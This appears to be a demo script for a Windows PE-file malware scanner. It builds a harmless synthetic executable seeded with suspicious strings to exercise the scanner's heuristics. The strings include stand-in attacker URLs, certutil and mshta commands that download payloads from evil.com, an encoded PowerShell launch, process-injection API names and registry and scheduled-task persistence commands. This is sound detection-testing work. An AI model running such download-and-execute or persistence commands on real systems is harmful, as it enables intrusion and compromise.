#!/usr/bin/env python3
"""
WinPE-Scan Demo - Generates a synthetic PE file and runs full analysis.

This script creates a realistic (but harmless) PE binary with embedded
suspicious patterns to demonstrate all analysis features. No actual
malware is created - the binary is a valid PE but non-functional.

Usage:
    python demo.py
"""

from __future__ import annotations

import os
import struct
import sys
import tempfile
from pathlib import Path

# Add parent dir to path so we can import winpe_scan
sys.path.insert(0, str(Path(__file__).parent.parent))

from winpe_scan.display import print_banner, print_info
from winpe_scan.heuristics import analyze
from winpe_scan.pe_parser import PEParser


def build_demo_pe() -> bytes:
    """Build a synthetic PE with suspicious patterns for demo purposes."""
    data = bytearray(32768)

    # ── DOS Header ──
    struct.pack_into("<H", data, 0, 0x5A4D)
    struct.pack_into("<I", data, 60, 64)

    # ── PE Signature ──
    struct.pack_into("<4s", data, 64, b"PE\x00\x00")

    # ── COFF File Header (i386, 3 sections) ──
    struct.pack_into("<H", data, 68, 0x014C)  # i386
    struct.pack_into("<H", data, 70, 3)  # 3 sections
    struct.pack_into("<I", data, 72, 0x5F000000)  # timestamp
    struct.pack_into("<H", data, 78, 96)  # OptHeader size
    struct.pack_into("<H", data, 82, 0x0102)  # characteristics

    # ── Optional Header (PE32) ──
    opt = 88
    struct.pack_into("<H", data, opt, 0x10B)
    struct.pack_into("<I", data, opt + 16, 0x1000)  # EP
    struct.pack_into("<I", data, opt + 28, 0x00400000)  # ImageBase
    struct.pack_into("<I", data, opt + 56, 0x20000)  # SizeOfImage
    struct.pack_into("<I", data, opt + 60, 0x200)  # SizeOfHeaders
    struct.pack_into("<H", data, opt + 68, 3)  # Subsystem CUI
    struct.pack_into("<H", data, opt + 70, 0x0100)  # NX only (no ASLR!)

    # ── Section 1: .text (writable + executable = suspicious!) ──
    sec1 = 88 + 96
    data[sec1:sec1 + 8] = b".text\x00\x00\x00"
    struct.pack_into("<I", data, sec1 + 8, 0x3000)
    struct.pack_into("<I", data, sec1 + 12, 0x1000)
    struct.pack_into("<I", data, sec1 + 16, 0x3000)
    struct.pack_into("<I", data, sec1 + 20, 0x200)
    struct.pack_into("<I", data, sec1 + 36, 0xE0000060)  # CODE|EXEC|READ|WRITE

    # ── Section 2: .data (high entropy section) ──
    sec2 = sec1 + 40
    data[sec2:sec2 + 8] = b".data\x00\x00\x00"
    struct.pack_into("<I", data, sec2 + 8, 0x2000)
    struct.pack_into("<I", data, sec2 + 12, 0x4000)
    struct.pack_into("<I", data, sec2 + 16, 0x2000)
    struct.pack_into("<I", data, sec2 + 20, 0x3200)
    struct.pack_into("<I", data, sec2 + 36, 0xC0000040)  # INIT_DATA|READ|WRITE

    # Fill .data with high-entropy-like pattern (alternating bytes)
    fill_size = min(0x1000, len(data) - 0x3200)
    for i in range(fill_size):
        data[0x3200 + i] = (i * 7 + 13) & 0xFF

    # ── Section 3: .rsrc ──
    sec3 = sec2 + 40
    data[sec3:sec3 + 8] = b".rsrc\x00\x00\x00"
    struct.pack_into("<I", data, sec3 + 8, 0x1000)
    struct.pack_into("<I", data, sec3 + 12, 0x6000)
    struct.pack_into("<I", data, sec3 + 16, 0x1000)
    struct.pack_into("<I", data, sec3 + 20, 0x5200)
    struct.pack_into("<I", data, sec3 + 36, 0x40000040)  # INIT_DATA|READ

    # ── Embed suspicious strings in .text section ──
    suspicious_strings = [
        b"http://malware-c2.evil.example.com/beacon",
        b"cmd.exe /c powershell -enc SQBmACgA...",
        b"VirtualAllocEx",
        b"WriteProcessMemory",
        b"CreateRemoteThread",
        b"IsDebuggerPresent",
        b"NtQueryInformationProcess",
        b"CryptEncrypt",
        b"RegSetValueExA",
        b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        b"Select * from AntivirusProduct",
        b"Win32_Process",
        b"certutil -urlcache -split -f http://evil.com/payload.exe",
        b"mshta.exe http://evil.com/payload.hta",
        b"bitcoin wallet address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        b"how_to_decrypt_README.txt",
        b"ransomware payment instructions",
        b"socket connect send recv",
        b"InternetOpenA InternetConnectA HttpSendRequestA",
        b"schtasks.exe /create /tn UpdateTask",
    ]

    pos = 0x2000  # Start of .text raw data
    for s in suspicious_strings:
        data[pos:pos + len(s)] = s
        pos += len(s) + 16  # Space between strings

    return bytes(data)


def main() -> None:
    """Run the demo."""
    print_banner()

    # Build synthetic PE
    pe_data = build_demo_pe()

    # Write to temp file
    with tempfile.NamedTemporaryFile(
        suffix=".exe", delete=False, prefix="demo_"
    ) as tmp:
        tmp.write(pe_data)
        tmp_path = tmp.name

    try:
        # Parse and analyze
        parser = PEParser(pe_data, Path(tmp_path).name)
        result = parser.parse()
        analyze(result)

        # Display full report
        print_info(result)

        print(
            f"\n  {C.CYAN}[*] Demo complete!{C.RESET}"
            f"  {C.DIM}This was a synthetic PE file"
            f" with embedded suspicious patterns.{C.RESET}\n"
        )
        print(
            f"  {C.DIM}Try it on real files:{C.RESET}\n"
            f"    winpe-scan info <file.exe>\n"
            f"    winpe-scan scan <file.exe>\n"
            f"    winpe-scan scan <file.exe> --vt\n"
            f"    winpe-scan scan -d /path/to/samples/\n"
            f"    winpe-scan hash <file.exe>\n"
            f"    winpe-scan compare <file1.exe> <file2.exe>\n"
        )
    finally:
        os.unlink(tmp_path)


if __name__ == "__main__":
    from winpe_scan.display import C
    main()
